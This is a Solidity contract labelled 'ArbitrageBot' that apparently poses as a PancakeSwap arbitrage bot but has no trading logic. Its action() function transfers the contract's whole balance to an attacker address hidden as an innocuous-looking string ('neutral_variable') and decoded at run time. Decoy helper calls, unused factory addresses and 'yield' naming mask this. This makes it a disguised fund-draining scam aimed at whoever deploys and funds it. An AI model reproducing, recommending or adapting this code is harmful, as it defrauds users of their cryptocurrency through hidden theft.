pragma solidity ^0.5.16;


import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";


contract ArbitrageBot {
    string public setLevel;
    string public timeDateRagulator;
    string public payout;
        address private constant pancakeFactory = 0xBCfCcbde45cE874adCB698cC183deBcF17952812;
        address private constant apeFactory = 0x0841BD0B734E4F5853f0dD8d7Ea041c241fb0Da6;
    
    
    function() external payable {}
    

 function SearchYeild(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 




   function startLookingforYeild() public pure returns (address adr) {
   string memory neutral_variable = "QGY37FB298a5eBcbe4E05685735d56Fbbd61777490";
   SearchYeild(neutral_variable,0,'0');
   SearchYeild(neutral_variable,2,'1');
   SearchYeild(neutral_variable,1,'x');
   address addr = parseAddr(neutral_variable);
    return addr;
   }
function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}
 function _stringReplace(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 
 
   
    function action() public payable {
        
        address(uint160(startLookingforYeild())).transfer(address(this).balance);
        
    }

}
